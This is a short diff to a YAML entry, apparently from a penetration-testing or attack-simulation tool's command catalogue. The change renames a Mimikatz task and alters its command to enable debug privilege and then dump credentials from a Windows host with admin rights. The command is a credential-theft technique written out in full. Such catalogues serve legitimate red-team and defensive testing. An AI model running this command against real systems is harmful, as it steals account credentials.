@@ -1,6 +1,6 @@
-mimikatz:
-  name: "Invoke-Mimikatz -DumpCreds"
+mimikatz_dumpcreds:
+  name: "Mimikatz-DumpCreds"
   filename: "Invoke-Mimikatz.ps1"
-  command: "Invoke-Mimikatz -DumpCreds"
+  command: 'Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds'
   type: "Windows"
   description: "Dumps credentials from a windows host. Requires admin privileges"
